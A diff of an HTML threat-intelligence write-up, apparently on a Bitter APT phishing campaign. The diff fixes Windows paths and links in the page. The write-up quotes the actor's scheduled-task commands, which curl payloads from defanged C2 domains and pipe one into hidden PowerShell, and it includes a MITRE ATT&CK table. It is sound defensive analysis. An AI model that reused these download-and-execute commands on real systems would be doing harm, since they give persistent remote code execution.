@@ -76,7 +76,7 @@ actor the name of the infected machine. These tactics have been observed being
 used by Bitter APT in
 &lt;a href="https://blog.talosintelligence.com/bitter-apt-adds-bangladesh-to-their/"target="_blank" rel="noopener"&gt;2021/2022&lt;/a&gt;.&lt;/p&gt;
 &lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
-&lt;div&gt;&lt;pre&gt;&lt;code&gt;&amp;#34;C:WindowsSystem32schtasks.exe&amp;#34; /create /sc MINUTE /mo 15 /TN WindowsDWMDWMCORE /TR &amp;#34;cmd /c start /min curl --output %AppData%dwmcor.exe -O &amp;#34;&amp;#34;https://qwavemediaservice[.]net/hkcu/qt.php/?dt=%computername%-QT-2&amp;amp;ct=QT&amp;#34;&amp;#34;&amp;#34; /f&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;&amp;#34;C:\Windows\System32\schtasks.exe&amp;#34; /create /sc MINUTE /mo 15 /TN WindowsDWMDWMCORE /TR &amp;#34;cmd /c start /min curl --output %AppData%\dwmcor.exe -O &amp;#34;&amp;#34;https://qwavemediaservice[.]net/hkcu/qt.php/?dt=%computername%-QT-2&amp;amp;ct=QT&amp;#34;&amp;#34;&amp;#34; /f&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
 &lt;button
 class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
 title="Copy code"
@@ -89,13 +89,13 @@ data-copied-label="Copied!"
 &lt;/div&gt;
 &lt;/div&gt;
 &lt;p&gt;&lt;figure&gt;
-&lt;img src="images/fig4" title="Figure 4: Scheduled task" alt="" loading="lazy" /&gt;
+&lt;img src="https://research.intezer.com/blog/2023/03/phishing-campaign-targets-nuclear-energy-industry/images/fig4.png" title="Figure 4: Scheduled task" alt="" loading="lazy" /&gt;
 &lt;figcaption&gt;Figure 4: Scheduled task&lt;/figcaption&gt;
 &lt;/figure&gt;&lt;/p&gt;
 &lt;p&gt;The second scheduled task created attempts to execute the payload downloaded by
 the other task:&lt;/p&gt;
 &lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
-&lt;div&gt;&lt;pre&gt;&lt;code&gt;&amp;#34;C:\Windows\System32\schtasks.exe&amp;#34; /create /sc MINUTE /mo 20 /TN WindowsDWMDWMCORELIB /TR &amp;#34;%AppData%dwmcor.exe&amp;#34; /f&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;&amp;#34;C:\Windows\System32\schtasks.exe&amp;#34; /create /sc MINUTE /mo 20 /TN WindowsDWMDWMCORELIB /TR &amp;#34;%AppData%\dwmcor.exe&amp;#34; /f&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
 &lt;button
 class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
 title="Copy code"
@@ -140,7 +140,7 @@ data-copied-label="Copied!"
 &lt;p&gt;We did not fetch any additional payloads from the C2, but we were served empty
 MSI files, allowing us to discover the names of the next stage payloads.&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;
-&lt;img src="images/fig5" title="Figure 5: Empty payloads served from different C2 servers" alt="" loading="lazy" /&gt;
+&lt;img src="https://research.intezer.com/blog/2023/03/phishing-campaign-targets-nuclear-energy-industry/images/fig5.png" title="Figure 5: Empty payloads served from different C2 servers" alt="" loading="lazy" /&gt;
 &lt;figcaption&gt;Figure 5: Empty payloads served from different C2 servers&lt;/figcaption&gt;
 &lt;/figure&gt;&lt;/p&gt;
 &lt;p&gt;This may allow the actor to examine the server logs of beaconing infected
@@ -162,7 +162,7 @@ concatenation.&lt;/p&gt;
 &lt;/figure&gt;&lt;/p&gt;
 &lt;p&gt;The decoded command is the following:&lt;/p&gt;
 &lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
-&lt;div&gt;&lt;pre&gt;&lt;code&gt;schtasks /create /tn WinSecurity /sc minute /mo 15 /tr &amp;#34;powershell.exe -WindowStyle Hidden -command curl -o %LOCALAPPDATA%pic.jpg https://coauthcn[.]com/hbz.php?id=%computername%;timeout 9;more %LOCALAPPDATA%pic.jpg|powershell;timeout 9;del %LOCALAPPDATA%pic.jpg&amp;#34; /f&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;schtasks /create /tn WinSecurity /sc minute /mo 15 /tr &amp;#34;powershell.exe -WindowStyle Hidden -command curl -o %LOCALAPPDATA%\pic.jpg https://coauthcn[.]com/hbz.php?id=%computername%;timeout 9;more %LOCALAPPDATA%\pic.jpg|powershell;timeout 9;del %LOCALAPPDATA%\pic.jpg&amp;#34; /f&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
 &lt;button
 class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
 title="Copy code"
@@ -259,67 +259,67 @@ data-copied-label="Copied!"
 &lt;tr&gt;
 &lt;td&gt;Reconnaissance&lt;/td&gt;
 &lt;td&gt;Email Addresses&lt;/td&gt;
-&lt;td&gt;T1589.002&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1589/002"target="_blank" rel="noopener"&gt;T1589.002&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;The actor gathers target email addresses to target with spearphishing emails&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Initial Access&lt;/td&gt;
 &lt;td&gt;Spearphishing Attachment&lt;/td&gt;
-&lt;td&gt;T1566.001&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1566/001"target="_blank" rel="noopener"&gt;T1566.001&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;Spearphishing is used to deliver RAR attachments&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Execution&lt;/td&gt;
 &lt;td&gt;PowerShell&lt;/td&gt;
-&lt;td&gt;T1059.001&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1059/001"target="_blank" rel="noopener"&gt;T1059.001&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;Encoded PowerShell is used by CHM payload&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Execution&lt;/td&gt;
 &lt;td&gt;Exploitation for Client Execution&lt;/td&gt;
-&lt;td&gt;T1203&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1203"target="_blank" rel="noopener"&gt;T1203&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;Microsoft Office exploits are used to execute code&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Persistence&lt;/td&gt;
 &lt;td&gt;Scheduled Task&lt;/td&gt;
-&lt;td&gt;T1053.005&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1053/005"target="_blank" rel="noopener"&gt;T1053.005&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;Scheduled Tasks used for both execution and persistence&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Defense Evasion&lt;/td&gt;
 &lt;td&gt;Msiexec&lt;/td&gt;
-&lt;td&gt;T1218.007&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1218/007"target="_blank" rel="noopener"&gt;T1218.007&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;Msiexec is used to launch next stage payloads&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Defense Evasion&lt;/td&gt;
 &lt;td&gt;Compiled HTML File&lt;/td&gt;
-&lt;td&gt;T1218.001&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1218/001"target="_blank" rel="noopener"&gt;T1218.001&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;CHM files are used to deliver payloads&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Defense Evasion&lt;/td&gt;
 &lt;td&gt;Masquerading&lt;/td&gt;
-&lt;td&gt;T1036&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1036"target="_blank" rel="noopener"&gt;T1036&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;Files are masqueraded as legitimate files and scheduled tasks are named after common tasks (eg. Adobe Updater)&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Discovery&lt;/td&gt;
 &lt;td&gt;System Information Discovery&lt;/td&gt;
-&lt;td&gt;T1082&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1082"target="_blank" rel="noopener"&gt;T1082&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;First stage payloads fetch Computer and User names&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Command and Control&lt;/td&gt;
 &lt;td&gt;Web Protocols&lt;/td&gt;
-&lt;td&gt;T1071.001&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1071/001"target="_blank" rel="noopener"&gt;T1071.001&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;HTTPS is used for C2 communication&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Command and Control&lt;/td&gt;
 &lt;td&gt;Exfiltration Over C2 Channel&lt;/td&gt;
-&lt;td&gt;T1041&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://attack.mitre.org/techniques/T1041"target="_blank" rel="noopener"&gt;T1041&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;Data can be exfiltrated&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
